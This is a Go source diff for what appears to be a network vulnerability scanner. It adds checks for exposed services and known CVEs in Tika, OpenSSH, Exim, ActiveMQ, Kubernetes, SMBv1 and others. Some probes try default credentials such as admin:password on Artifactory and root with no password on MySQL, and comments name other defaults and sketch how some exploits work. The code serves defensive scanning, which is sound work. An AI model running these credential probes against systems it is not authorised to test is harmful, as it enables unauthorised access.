+				"An SMTP server is publicly accessible. The banner may reveal internal hostnames, MTA software, and version. "+
+					"Internet-facing SMTP is expected for mail delivery (port 25) but should be version-hardened. "+
+					"Submission port 587 should require authentication (AUTH PLAIN/LOGIN over TLS only).",
+				map[string]any{"port": port, "service": service, "banner": banner},
+			)}
 		}
 
 	case 143, 993: // IMAP / IMAPS
@@ -1431,6 +2439,44 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 			map[string]any{"port": port, "service": service, "banner": banner},
 		)}
 
+	// ── Apache Tika Server ────────────────────────────────────────────────────
+
+	case 9998: // Apache Tika Server REST API
+		// CVE-2018-1335: Apache Tika Server 1.7–1.17 allows command injection via
+		// X-Tika-OCR* HTTP headers which are passed unsanitized to external tool invocations.
+		// GET /version returns the Tika version; GET /tika returns "This is Tika Server".
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/version"); ok {
+			ev := map[string]any{"port": port, "service": service, "banner": banner}
+			tikaVer := strings.TrimSpace(body)
+			if strings.HasPrefix(strings.ToLower(tikaVer), "apache tika ") {
+				tikaVer = tikaVer[len("apache tika "):]
+			}
+			ev["tika_version"] = tikaVer
+			if isApacheTikaRCEVulnerable(tikaVer) {
+				return []finding.Finding{makeF(
+					finding.CheckCVEApacheTikaRCE,
+					finding.SeverityCritical,
+					fmt.Sprintf("CVE-2018-1335: Apache Tika Server %s vulnerable to command injection RCE", tikaVer),
+					fmt.Sprintf("Apache Tika Server %s is internet-accessible and vulnerable to CVE-2018-1335 (CVSS 9.8). "+
+						"The X-Tika-OCRTesseractPath and X-Tika-OCRLanguage HTTP headers are passed unsanitized to "+
+						"external process invocations (Tesseract OCR), enabling OS command injection via a PUT request "+
+						"to /tika with Content-Type: image/jp2. Upgrade to Apache Tika Server ≥ 1.18 immediately and "+
+						"restrict the Tika Server REST API to trusted internal networks.", tikaVer),
+					ev,
+				)}
+			}
+			// Tika found but version is safe or unknown — still flag exposure.
+			return []finding.Finding{makeF(
+				finding.CheckCVEApacheTikaRCE,
+				finding.SeverityHigh,
+				fmt.Sprintf("Apache Tika Server REST API exposed on port %d", port),
+				"An Apache Tika Server REST API is internet-accessible without authentication. "+
+					"Tika Server is a document parsing service not designed for direct internet exposure. "+
+					"Verify the version is ≥ 1.18 (CVE-2018-1335 command injection) and restrict to internal networks.",
+				ev,
+			)}
+		}
+
 	// ── Kibana ────────────────────────────────────────────────────────────────
 
 	case 5601: // Kibana
@@ -1470,6 +2516,161 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 			)}
 		}
 
+	// ── JFrog Artifactory / Sonatype Nexus ──────────────────────────────────────
+	case 8081, 8082:
+		// Probe for JFrog Artifactory.
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/artifactory/api/system/ping"); ok {
+			if strings.TrimSpace(body) == "OK" || strings.Contains(strings.ToLower(body), "artifactory") {
+				// Attempt default admin:password credentials on the REST API.
+				if _, authed := probeHTTPBodyWithAuth(ctx, asset, port, false, "/artifactory/api/system/configuration", "admin", "password"); authed {
+					return []finding.Finding{makeF(
+						finding.CheckPortArtifactoryExposed,
+						finding.SeverityCritical,
+						fmt.Sprintf("JFrog Artifactory accepts default admin:password credentials on port %d", port),
+						"JFrog Artifactory repository manager accepts the default admin:password credentials. "+
+							"An attacker gains full administrative control: read/write all artifact repositories "+
+							"(including private packages), inject malicious artifacts into the supply chain, "+
+							"export credentials to external registries, and access pipeline secrets. "+
+							"Change admin password immediately and enable access tokens with least privilege.",
+						map[string]any{"port": port, "service": "artifactory", "creds": "admin:password", "authenticated": true},
+					)}
+				}
+				return []finding.Finding{makeF(
+					finding.CheckPortArtifactoryExposed,
+					finding.SeverityHigh,
+					fmt.Sprintf("JFrog Artifactory repository manager exposed on port %d", port),
+					"A JFrog Artifactory repository manager is publicly accessible. "+
+						"Artifactory hosts build artifacts, Docker images, npm/Maven/PyPI packages, and pipeline credentials. "+
+						"Unauthenticated access or default credentials allow supply chain compromise by "+
+						"injecting malicious artifacts into repositories used by development pipelines. "+
+						"Restrict access to trusted networks and rotate all repository credentials.",
+					map[string]any{"port": port, "service": "artifactory",
+						"url": fmt.Sprintf("http://%s:%d/artifactory/", asset, port)},
+				)}
+			}
+		}
+		// Probe for Sonatype Nexus Repository Manager.
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/service/rest/v1/status"); ok {
+			bodyLow := strings.ToLower(body)
+			if strings.Contains(bodyLow, "nexus") || strings.Contains(bodyLow, "sonatype") {
+				return []finding.Finding{makeF(
+					finding.CheckPortNexusExposed,
+					finding.SeverityHigh,
+					fmt.Sprintf("Sonatype Nexus Repository Manager exposed on port %d", port),
+					"A Sonatype Nexus Repository Manager is publicly accessible. "+
+						"Nexus hosts Maven, npm, Docker, PyPI, and raw binary artifacts. "+
+						"Older Nexus versions use default credentials (admin:admin123) and may be vulnerable to "+
+						"CVE-2019-7238 (Nexus 3 < 3.15.0 pre-auth RCE via EL injection, CVSS 9.8, KEV). "+
+						"Restrict to trusted networks and update to the latest version.",
+					map[string]any{"port": port, "service": "nexus",
+						"url": fmt.Sprintf("http://%s:%d/", asset, port)},
+				)}
+			}
+		}
+		// Also check Nexus UI root.
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/"); ok {
+			bodyLow := strings.ToLower(body)
+			if strings.Contains(bodyLow, "nexus repository") || strings.Contains(bodyLow, "sonatype nexus") {
+				return []finding.Finding{makeF(
+					finding.CheckPortNexusExposed,
+					finding.SeverityHigh,
+					fmt.Sprintf("Sonatype Nexus Repository Manager detected on port %d", port),
+					"A Sonatype Nexus Repository Manager is publicly accessible. "+
+						"Check for default admin:admin123 credentials and CVE-2019-7238 (pre-auth RCE, CVSS 9.8, KEV).",
+					map[string]any{"port": port, "service": "nexus"},
+				)}
+			}
+		}
+
+	// ── gRPC server reflection ─────────────────────────────────────────────────
+	case 50051:
+		// gRPC typically uses HTTP/2. Probe by sending the HTTP/2 connection preface
+		// and a minimal SETTINGS frame. A valid HTTP/2 SETTINGS response confirms gRPC.
+		if probeGRPCReflection(ctx, asset, port) {
+			return []finding.Finding{makeF(
+				finding.CheckPortGRPCReflectionEnabled,
+				finding.SeverityHigh,
+				fmt.Sprintf("gRPC server reflection enabled on port %d (unauthenticated)", port),
+				"A gRPC server with reflection enabled is publicly accessible on port 50051. "+
+					"gRPC reflection lists all available service definitions, method names, and protobuf schemas "+
+					"without authentication, acting as an unauthenticated API documentation endpoint. "+
+					"Attackers use reflection to enumerate all gRPC endpoints and craft targeted requests "+
+					"for further exploitation. Disable reflection in production "+
+					"(grpc.EnableReflection = false) and restrict port 50051 to internal services only.",
+				map[string]any{"port": port, "service": "grpc", "reflection": true},
+			)}
+		}
+
+	// ── Cisco Smart Install (CVE-2018-0171) ────────────────────────────────────
+	case 4786:
+		// Cisco IOS Smart Install protocol on port 4786 allows unauthenticated read/write
+		// of device configuration (CVSS 9.8, KEV, actively exploited by threat actors).
+		// The port being open and accepting a TCP connection is itself the finding —
+		// Smart Install has no authentication layer whatsoever.
+		return []finding.Finding{makeF(
+			finding.CheckPortCiscoSmartInstall,
+			finding.SeverityCritical,
+			fmt.Sprintf("CVE-2018-0171: Cisco Smart Install protocol exposed on port %d", port),
+			"The Cisco IOS Smart Install protocol is accessible on port 4786. "+
+				"CVE-2018-0171 (CVSS 9.8, KEV) allows unauthenticated attackers to read and write "+
+				"the device configuration, change the TFTP server, and reload the device. "+
+				"Smart Install is actively exploited by state-sponsored threat actors for network infrastructure "+
+				"takeover. Disable Smart Install with 'no vstack' in IOS configuration and block port 4786 "+
+				"at the network perimeter.",
+			map[string]any{"port": port, "service": service, "protocol": "smart-install", "banner": banner},
+		)}
+
+	// ── Nacos service discovery / config center ────────────────────────────────
+	case 8848:
+		// Nacos service discovery and configuration management platform.
+		// Default credentials nacos:nacos allow full cluster control.
+		// GET /nacos/v1/cs/configs?dataId=&group=&tenant= lists all config entries.
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/nacos/v1/cs/configs?dataId=&group=&tenant="); ok {
+			bodyLow := strings.ToLower(body)
+			if strings.Contains(bodyLow, "pageitems") || strings.Contains(bodyLow, "nacos") ||
+				strings.Contains(bodyLow, "totalcount") {
+				return []finding.Finding{makeF(
+					finding.CheckPortNacosExposed,
+					finding.SeverityHigh,
+					fmt.Sprintf("Nacos service discovery/config center exposed unauthenticated on port %d", port),
+					"A Nacos service discovery and configuration management platform is publicly accessible. "+
+						"Nacos installations often ship with default credentials (nacos:nacos) and no network restriction. "+
+						"Unauthenticated or default-credential access exposes all service registrations, "+
+						"configuration data (including secrets and database passwords), and allows "+
+						"arbitrary configuration injection to all connected microservices. "+
+						"Enable Nacos authentication mode (nacos.core.auth.enabled=true) and rotate default credentials.",
+					map[string]any{"port": port, "service": service,
+						"url": fmt.Sprintf("http://%s:%d/nacos/v1/cs/configs", asset, port)},
+				)}
+			}
+		}
+
+	// ── HashiCorp Consul (no ACL) ──────────────────────────────────────────────
+	case 8500:
+		// Consul REST API — GET /v1/catalog/nodes returns all nodes without auth when ACLs are disabled.
+		// No-ACL Consul exposes full cluster topology, service endpoints, key-value store (often with secrets),
+		// and allows arbitrary service registration / deregistration.
+		if body, ok := probeHTTPBody(ctx, asset, port, false, "/v1/catalog/nodes"); ok {
+			bodyLow := strings.ToLower(body)
+			if strings.HasPrefix(strings.TrimSpace(body), "[") &&
+				(strings.Contains(bodyLow, "node") || strings.Contains(bodyLow, "address") ||
+					strings.Contains(bodyLow, "datacenter")) {
+				return []finding.Finding{makeF(
+					finding.CheckPortConsulNoACL,
+					finding.SeverityHigh,
+					fmt.Sprintf("HashiCorp Consul responds without ACL authentication on port %d", port),
+					"A HashiCorp Consul service mesh instance returns cluster node information without authentication. "+
+						"With ACLs disabled, the Consul API exposes full cluster topology, all registered services "+
+						"and their network endpoints, and the key-value store (which often contains secrets, "+
+						"TLS certificates, and database credentials). An attacker can also register malicious "+
+						"services to redirect internal traffic. Enable Consul ACLs "+
+						"(acl { enabled = true }) and restrict the HTTP port to trusted networks.",
+					map[string]any{"port": port, "service": service,
+						"url": fmt.Sprintf("http://%s:%d/v1/catalog/nodes", asset, port)},
+				)}
+			}
+		}
+
 	}
 
 	// No structured check for this service — return nothing.
@@ -1490,9 +2691,10 @@ var webServicePorts = map[int]string{
 	7474:  "neo4j-browser",
 	8001:  "k8s-proxy",
 	8080:  "http-alt",
-	8081:  "http-alt-2",
 	8200:  "vault",
+	8000:  "salt-api",
 	8086:  "influxdb",
+	16992: "intel-amt",
 	8089:  "splunk-mgmt",
 	8443:  "https-alt",
 	8500:  "consul",
@@ -1504,6 +2706,17 @@ var webServicePorts = map[int]string{
 	9091:  "prometheus-pushgateway",
 	9200:  "elasticsearch",
 	15672: "rabbitmq-mgmt",
+	8088:  "superset",
+	8123:  "clickhouse",
+	8222:  "nats-monitoring",
+	8265:  "ray-dashboard",
+	9097:  "tekton-dashboard",
+	30000: "sglang",
+	61616: "activemq",
+	8009:  "ajp-tomcat",
+	8188:  "comfyui",
+	8006:  "proxmox",
+	19999: "netdata",
 	16686: "jaeger-ui",
 	4848:  "glassfish-admin",
 	7001:  "weblogic",
@@ -1514,6 +2727,15 @@ var webServicePorts = map[int]string{
 	55000: "wazuh-api",
 	9401:  "veeam-mgmt",
 	9419:  "veeam-catalog",
+	4786:  "cisco-smart-install",
+	8848:  "nacos",
+	8081:  "artifactory",
+	8082:  "artifactory-alt",
+	// Wireless management
+	8880:  "unifi-portal",
+	8843:  "unifi-portal-tls",
+	4343:  "aruba-instant",
+	8043:  "omada-alt",
 }
 
 // EmitPortServiceDiscovered returns a CheckPortServiceDiscovered finding when
@@ -1620,16 +2842,19 @@ func isVulnerableRedis(version string) bool {
 		patch, _ = strconv.Atoi(parts[2])
 	}
 	switch {
+	case major < 7:
+		return true // all older majors unpatched
 	case major == 7 && minor == 2:
 		return patch < 11
 	case major == 7 && minor == 4:
 		return patch < 6
+	case major == 7:
+		// 7.0, 7.1, 7.3, etc. are EOL and unpatched for this CVE
+		return true
 	case major == 8 && minor == 0:
 		return patch < 4
 	case major == 8 && minor == 2:
 		return patch < 2
-	case major < 7:
-		return true // all older majors unpatched
 	default:
 		return false
 	}
@@ -1706,6 +2931,48 @@ func probeHTTP(ctx context.Context, host string, port int, useTLS bool, path str
 	}
 	defer resp.Body.Close()
 	return resp.StatusCode == http.StatusOK
+}
+
+// probeIngressAdmissionWebhook probes port 8443 for an exposed ingress-nginx
+// admission controller webhook (CVE-2025-1974, IngressNightmare). It POSTs a
+// minimal AdmissionReview JSON and returns the response body if the endpoint
+// looks like a Kubernetes admission webhook (body contains "AdmissionReview"
+// or "admission.k8s.io"). Returns "" when no webhook is detected.
+func probeIngressAdmissionWebhook(ctx context.Context, host string, port int) string {
+	url := fmt.Sprintf("https://%s:%d/admission", host, port)
+	transport := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
+		DialContext:     (&net.Dialer{Timeout: dialTimeout}).DialContext,
+	}
+	client := &http.Client{
+		Timeout:   httpTimeout,
+		Transport: transport,
+		CheckRedirect: func(*http.Request, []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+	}
+	body := `{"apiVersion":"admission.k8s.io/v1","kind":"AdmissionReview","request":{}}`
+	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url,
+		strings.NewReader(body))
+	if err != nil {
+		return ""
+	}
+	req.Header.Set("Content-Type", "application/json")
+	resp, err := client.Do(req)
+	if err != nil {
+		return ""
+	}
+	defer resp.Body.Close()
+	b, err := io.ReadAll(io.LimitReader(resp.Body, 4096))
+	if err != nil {
+		return ""
+	}
+	s := string(b)
+	if strings.Contains(s, "AdmissionReview") || strings.Contains(s, "admission.k8s.io") ||
+		strings.Contains(s, "admission") && strings.Contains(s, "ingress") {
+		return s
+	}
+	return ""
 }
 
 // probeMemcached sends the ASCII stats command and checks for STAT in the response.
@@ -2081,6 +3348,83 @@ func parseSSHVersion(banner string) string {
 	return software
 }
 
+// isOpenSSHUsernameEnumVulnerable returns true when the OpenSSH version is < 7.7p1,
+// the range affected by CVE-2018-15473 username enumeration. Fixed in 7.7p1 (Apr 2018).
+func isOpenSSHUsernameEnumVulnerable(sv string) bool {
+	if !strings.HasPrefix(sv, "OpenSSH_") {
+		return false
+	}
+	verStr := sv[len("OpenSSH_"):]
+	dotIdx := strings.IndexByte(verStr, '.')
+	if dotIdx == -1 {
+		return false
+	}
+	pIdx := strings.IndexAny(verStr, "p ")
+	endIdx := len(verStr)
+	if pIdx != -1 {
+		endIdx = pIdx
+	}
+	maj, min := 0, 0
+	fmt.Sscanf(verStr[:dotIdx], "%d", &maj)
+	fmt.Sscanf(verStr[dotIdx+1:endIdx], "%d", &min)
+	// Vulnerable: any version < 7.7
+	if maj < 7 {
+		return true
+	}
+	if maj == 7 && min < 7 {
+		return true
+	}
+	return false
+}
+
+// isOpenSSHRegreSSHionVulnerable returns true when the SSH banner indicates an
+// OpenSSH version in the CVE-2024-6387 (regreSSHion) vulnerable range:
+// 8.5p1 ≤ version ≤ 9.7p1 on a glibc-based (non-OpenBSD) system.
+// The bug is a signal-handler race allowing pre-auth RCE as root on Linux.
+// Version 9.8p1 contains the fix; OpenBSD-based builds are not affected.
+func isOpenSSHRegreSSHionVulnerable(sv, banner string) bool {
+	if !strings.HasPrefix(sv, "OpenSSH_") {
+		return false
+	}
+	// OpenBSD builds are not affected by the glibc race.
+	if strings.Contains(strings.ToLower(banner), "openbsd") {
+		return false
+	}
+	// Parse version number from "OpenSSH_X.Yp1" → X.Y as float.
+	verStr := sv[len("OpenSSH_"):] // e.g. "9.7p1" or "8.5p2"
+	dotIdx := strings.IndexByte(verStr, '.')
+	if dotIdx == -1 {
+		return false
+	}
+	pIdx := strings.IndexAny(verStr, "p ")
+	endIdx := len(verStr)
+	if pIdx != -1 {
+		endIdx = pIdx
+	}
+	major := verStr[:dotIdx]
+	minor := verStr[dotIdx+1 : endIdx]
+	maj := 0
+	min := 0
+	fmt.Sscanf(major, "%d", &maj)
+	fmt.Sscanf(minor, "%d", &min)
+	// Vulnerable: 8.5 ≤ version ≤ 9.7
+	if maj == 8 && min >= 5 {
+		return true
+	}
+	if maj == 9 && min <= 7 {
+		return true
+	}
+	return false
+}
+
+// isProFTPDModCopyVulnerable returns true when the FTP version string indicates
+// ProFTPD 1.3.5 without the "a" patch suffix (CVE-2015-3306). ProFTPD 1.3.5a
+// and later report themselves as such, so an exact "ProFTPD 1.3.5" match is
+// an unambiguous indicator of the unpatched release.
+func isProFTPDModCopyVulnerable(fv string) bool {
+	return fv == "ProFTPD 1.3.5"
+}
+
 // parseFTPVersion extracts the server software string from an FTP 220 banner.
 // Examples:
 //   - "220 ProFTPD 1.3.6 Server (hostname)"  → "ProFTPD 1.3.6"
@@ -2121,6 +3465,82 @@ func parseJSONStringField(body, key string) string {
 	return rest[:end]
 }
 
+// isElasticsearchGroovyVulnerable returns true when the Elasticsearch version is
+// in the range that has dynamic Groovy scripting enabled by default (≤ 1.5.x).
+// CVE-2015-1427: the Groovy sandbox is bypassable, allowing unauthenticated RCE.
+// Fixed in Elasticsearch 1.6.0 (scripting disabled by default); removed in 2.0.
+func isElasticsearchGroovyVulnerable(ver string) bool {
+	if ver == "" {
+		return false
+	}
+	parts := strings.SplitN(ver, ".", 3)
+	if len(parts) < 2 {
+		return false
+	}
+	major, minor := 0, 0
+	fmt.Sscanf(parts[0], "%d", &major)
+	fmt.Sscanf(parts[1], "%d", &minor)
+	return major == 1 && minor < 6
+}
+
+// probeK8sVersion fetches the Kubernetes /version endpoint (unauthenticated by
+// default) and returns the gitVersion string (e.g. "v1.11.4"). Returns "" on error.
+func probeK8sVersion(ctx context.Context, host string, port int) string {
+	body, ok := probeHTTPBody(ctx, host, port, true, "/version")
+	if !ok {
+		body, ok = probeHTTPBody(ctx, host, port, false, "/version")
+		if !ok {
+			return ""
+		}
+	}
+	ver := parseJSONStringField(body, "gitVersion")
+	return strings.TrimPrefix(ver, "v")
+}
+
+// isKubernetesPrivEscVulnerable returns true when the Kubernetes gitVersion is
+// in a range affected by CVE-2018-1002105 (WebSocket upgrade privilege escalation):
+// < 1.10.11, < 1.11.5, or < 1.12.3.
+func isKubernetesPrivEscVulnerable(ver string) bool {
+	parts := strings.SplitN(ver, ".", 3)
+	if len(parts) < 3 {
+		return false
+	}
+	maj, min, patch := 0, 0, 0
+	fmt.Sscanf(parts[0], "%d", &maj)
+	// Strip pre-release suffix from minor/patch (e.g. "11-gke.1" → 11)
+	fmt.Sscanf(parts[1], "%d", &min)
+	fmt.Sscanf(parts[2], "%d", &patch)
+	if maj != 1 {
+		return false
+	}
+	switch {
+	case min <= 9:
+		return true // all 1.x where x < 10 are vulnerable
+	case min == 10:
+		return patch < 11
+	case min == 11:
+		return patch < 5
+	case min == 12:
+		return patch < 3
+	default:
+		return false // 1.13+ patched
+	}
+}
+
+// isApacheTikaRCEVulnerable returns true when the Tika Server version is in
+// the range affected by CVE-2018-1335 (X-Tika-OCR* command injection): 1.7–1.17.
+// Fixed in 1.18.
+func isApacheTikaRCEVulnerable(ver string) bool {
+	parts := strings.SplitN(ver, ".", 3)
+	if len(parts) < 2 {
+		return false
+	}
+	maj, min := 0, 0
+	fmt.Sscanf(parts[0], "%d", &maj)
+	fmt.Sscanf(parts[1], "%d", &min)
+	return maj == 1 && min >= 7 && min <= 17
+}
+
 // isVulnerableKibana returns true when the Kibana version falls in the range
 // 8.15.0–8.17.2 affected by CVE-2025-25015 (prototype pollution → RCE, CVSS 9.9).
 // Patched in 8.17.3.
@@ -2151,6 +3571,47 @@ func isVulnerableKibana(version string) bool {
 	return true
 }
 
+// isVulnerableOllamaVersion returns true when the /api/version JSON body indicates
+// an Ollama version below 0.1.47, which is vulnerable to GHSA-q3jj-7xxq-6mgr
+// (directory traversal via the model blob endpoint).
+func isVulnerableOllamaVersion(body string) bool {
+	// Body is JSON like {"version":"0.1.45"}
+	idx := strings.Index(body, `"version":"`)
+	if idx < 0 {
+		return false
+	}
+	after := body[idx+len(`"version":"`):]
+	end := strings.IndexByte(after, '"')
+	if end < 0 {
+		return false
+	}
+	ver := after[:end]
+	parts := strings.SplitN(ver, ".", 3)
+	if len(parts) < 3 {
+		return false
+	}
+	major, err := strconv.Atoi(parts[0])
+	if err != nil || major != 0 {
+		return false
+	}
+	minor, err := strconv.Atoi(parts[1])
+	if err != nil {
+		return false
+	}
+	patch, err := strconv.Atoi(parts[2])
+	if err != nil {
+		return false
+	}
+	// Vulnerable: < 0.1.47
+	if minor < 1 {
+		return true
+	}
+	if minor == 1 && patch < 47 {
+		return true
+	}
+	return false
+}
+
 // probeMinIODefaultCreds attempts to log in to the MinIO console with the
 // factory-default credentials minioadmin/minioadmin via the /api/v1/login
 // JSON endpoint. Returns true if the server accepts the credentials.
@@ -2178,7 +3639,14 @@ func probeMinIODefaultCreds(ctx context.Context, host string, port int) bool {
 		return false
 	}
 	b, _ := io.ReadAll(io.LimitReader(resp.Body, 512))
-	return strings.Contains(string(b), "token") || strings.Contains(string(b), "sessionId")
+	var loginResp struct {
+		Token     string `json:"token"`
+		SessionID string `json:"sessionId"`
+	}
+	if err := json.Unmarshal(b, &loginResp); err != nil {
+		return false
+	}
+	return loginResp.Token != "" || loginResp.SessionID != ""
 }
 
 // parseWingFTPVersion extracts the version number from a Wing FTP Server banner.
@@ -2505,6 +3973,48 @@ func probeFTPAnonymous(ctx context.Context, host string, port int) bool {
 
 // ── SMB null session probe ────────────────────────────────────────────────────
 
+// probeSMBv1Enabled connects to port 445 and sends a multi-dialect SMB Negotiate
+// request. It returns true when the server selects SMBv1 ("NT LM 0.12") over SMBv2/3
+// — identifiable by the \xffSMB magic bytes in the response (vs \xfeSMB for SMB2+).
+// SMBv1 is the prerequisite for CVE-2017-0144 (EternalBlue/WannaCry), CVE-2017-7494
+// (SambaCry), and numerous other protocol-level attacks. A modern Windows server
+// with SMBv2+ enabled will respond \xfeSMB and return false here.
+func probeSMBv1Enabled(ctx context.Context, host string) bool {
+	d := &net.Dialer{Timeout: dialTimeout}
+	conn, err := d.DialContext(ctx, "tcp", fmt.Sprintf("%s:445", host))
+	if err != nil {
+		return false
+	}
+	defer conn.Close()
+	conn.SetDeadline(time.Now().Add(5 * time.Second)) //nolint:errcheck
+
+	// Multi-dialect negotiate: include NT LM 0.12 (SMBv1) and SMB 2.x dialects.
+	// If the server selects SMBv1, its response header starts with \xff\x53\x4d\x42.
+	// If it selects SMBv2+, the response starts with \xfe\x53\x4d\x42.
+	negotiate := []byte{
+		0x00, 0x00, 0x00, 0x54,
+		0xff, 0x53, 0x4d, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00,
+		0x18, 0x01, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+		0x00, 0x00, 0x00, 0x00, 0xff, 0xfe, 0x00, 0x00, 0x40, 0x00,
+		0x00,
+		0x26, 0x00,
+		0x02, 0x4e, 0x54, 0x20, 0x4c, 0x4d, 0x20, 0x30, 0x2e, 0x31, 0x32, 0x00, // NT LM 0.12
+		0x02, 0x53, 0x4d, 0x42, 0x20, 0x32, 0x2e, 0x30, 0x30, 0x32, 0x00,       // SMB 2.002
+		0x02, 0x53, 0x4d, 0x42, 0x20, 0x32, 0x2e, 0x3f, 0x3f, 0x3f, 0x00,       // SMB 2.???
+	}
+	if _, err := conn.Write(negotiate); err != nil {
+		return false
+	}
+	resp := make([]byte, 64)
+	n, err := conn.Read(resp)
+	if err != nil || n < 8 {
+		return false
+	}
+	// \xffSMB in the response means the server selected SMBv1 — vulnerable to EternalBlue class.
+	// \xfeSMB means SMBv2/3 was selected — SMBv1 is disabled.
+	return resp[4] == 0xff && resp[5] == 0x53 && resp[6] == 0x4d && resp[7] == 0x42
+}
+
 // probeSMBNullSession attempts an SMB null session negotiation.
 // Sends SMBv1 Negotiate + SessionSetupAndX with empty credentials.
 // Returns true when the server accepts the unauthenticated session (action flag bit 0 = guest/null).
@@ -2623,6 +4133,107 @@ func probeSMBNullSession(ctx context.Context, host string) bool {
 	return true
 }
 
+// ── Exim version parsing ──────────────────────────────────────────────────────
+
+// parseEximVersion extracts the Exim version number from an SMTP banner.
+// Banners look like: "220 hostname ESMTP Exim 4.89 Mon, 28 Mar 2026 ..."
+// Returns empty string if not found.
+func parseEximVersion(banner string) string {
+	lower := strings.ToLower(banner)
+	idx := strings.Index(lower, "exim ")
+	if idx < 0 {
+		return ""
+	}
+	rest := strings.TrimSpace(banner[idx+5:])
+	fields := strings.Fields(rest)
+	if len(fields) == 0 {
+		return ""
+	}
+	// First token after "exim " is the version (e.g. "4.89", "4.98.1")
+	v := fields[0]
+	// Validate it looks like a version (starts with a digit)
+	if len(v) == 0 || v[0] < '0' || v[0] > '9' {
+		return ""
+	}
+	return v
+}
+
+// isActiveMQRCE2023Vulnerable parses the ActiveMQ version from a banner string and
+// returns (true, version) when the version is vulnerable to CVE-2023-46604.
+// The OpenWire binary banner contains the version string as a substring, e.g. "5.16.3".
+// Vulnerable ranges: < 5.15.16, 5.16.x < 5.16.7, 5.17.x < 5.17.6, 5.18.x < 5.18.3.
+func isActiveMQRCE2023Vulnerable(banner string) (bool, string) {
+	// Look for a version pattern like "5.16.3" in the banner.
+	var maj, min, patch int
+	// Scan through the banner string for digit sequences matching x.y.z
+	for i := 0; i < len(banner)-4; i++ {
+		if banner[i] >= '0' && banner[i] <= '9' {
+			n, err := fmt.Sscanf(banner[i:], "%d.%d.%d", &maj, &min, &patch)
+			if err != nil || n != 3 {
+				continue
+			}
+			if maj != 5 {
+				continue
+			}
+			verStr := fmt.Sprintf("%d.%d.%d", maj, min, patch)
+			switch {
+			case min < 15:
+				return true, verStr
+			case min == 15 && patch < 16:
+				return true, verStr
+			case min == 16 && patch < 7:
+				return true, verStr
+			case min == 17 && patch < 6:
+				return true, verStr
+			case min == 18 && patch < 3:
+				return true, verStr
+			}
+			return false, verStr
+		}
+	}
+	return false, ""
+}
+
+// isEximHeapOverflowVulnerable returns true when the Exim version is before 4.90.1,
+// the fix for CVE-2018-6789 (base64d() off-by-one heap overflow → pre-auth RCE).
+// All Exim versions through 4.90.0 are affected; 4.90.1 contains the fix.
+func isEximHeapOverflowVulnerable(ver string) bool {
+	parts := strings.Split(ver, ".")
+	if len(parts) < 2 {
+		return false
+	}
+	major, minor, patch := 0, 0, 0
+	fmt.Sscanf(parts[0], "%d", &major)
+	fmt.Sscanf(parts[1], "%d", &minor)
+	if len(parts) >= 3 {
+		fmt.Sscanf(parts[2], "%d", &patch)
+	}
+	if major != 4 {
+		return false
+	}
+	if minor < 90 {
+		return true
+	}
+	if minor == 90 {
+		return patch < 1
+	}
+	return false
+}
+
+// isEximRCE2019Vulnerable returns true when the Exim version is in the range
+// 4.87–4.91 vulnerable to CVE-2019-10149 (DELIVER_FAIL_STR local-part expansion RCE).
+// Fixed in Exim 4.92 released 2019-06-04.
+func isEximRCE2019Vulnerable(ver string) bool {
+	parts := strings.Split(ver, ".")
+	if len(parts) < 2 {
+		return false
+	}
+	major, minor := 0, 0
+	fmt.Sscanf(parts[0], "%d", &major)
+	fmt.Sscanf(parts[1], "%d", &minor)
+	return major == 4 && minor >= 87 && minor <= 91
+}
+
 // ── SMTP open relay probe ─────────────────────────────────────────────────────
 
 // probeSMTPOpenRelay tests whether the SMTP server relays mail for arbitrary
@@ -2674,4 +4285,596 @@ func probeSMTPOpenRelay(ctx context.Context, host string, port int) bool {
 
 	send("RSET")
 	return accepted
+}
+
+// probeHTTPBodyWithAuth makes an authenticated HTTP GET request and returns the body.
+// Returns ("", false) if the response is not 200 OK.
+func probeHTTPBodyWithAuth(ctx context.Context, host string, port int, useTLS bool, path, user, pass string) (string, bool) {
+	scheme := "http"
+	if useTLS {
+		scheme = "https"
+	}
+	u := fmt.Sprintf("%s://%s:%d%s", scheme, host, port, path)
+	transport := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
+		DialContext:     (&net.Dialer{Timeout: dialTimeout}).DialContext,
+	}
+	client := &http.Client{
+		Timeout:   httpTimeout,
+		Transport: transport,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+	}
+	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
+	if err != nil {
+		return "", false
+	}
+	req.SetBasicAuth(user, pass)
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", false
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != http.StatusOK {
+		return "", false
+	}
+	buf := make([]byte, 8192)
+	n, _ := io.ReadFull(resp.Body, buf)
+	return string(buf[:n]), true
+}
+
+// probeMySQL attempts a MySQL authentication handshake with user root and empty password.
+// Returns true if the server responds with an OK packet (0x00 first byte after length prefix),
+// indicating root access with no password is accepted.
+func probeMySQL(ctx context.Context, host string, port int) bool {
+	addr := fmt.Sprintf("%s:%d", host, port)
+	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
+	if err != nil {
+		return false
+	}
+	defer conn.Close()
+	conn.SetDeadline(time.Now().Add(httpTimeout)) //nolint:errcheck
+
+	// Read the server greeting (initial handshake packet).
+	// MySQL packet format: 3-byte length (LE) + 1-byte sequence number + payload
+	hdr := make([]byte, 4)
+	if _, err := io.ReadFull(conn, hdr); err != nil {
+		return false
+	}
+	pktLen := int(hdr[0]) | int(hdr[1])<<8 | int(hdr[2])<<16
+	if pktLen == 0 || pktLen > (1<<24) { // MySQL max packet is 16MB
+		return false
+	}
+	greeting := make([]byte, pktLen)
+	if _, err := io.ReadFull(conn, greeting); err != nil {
+		return false
+	}
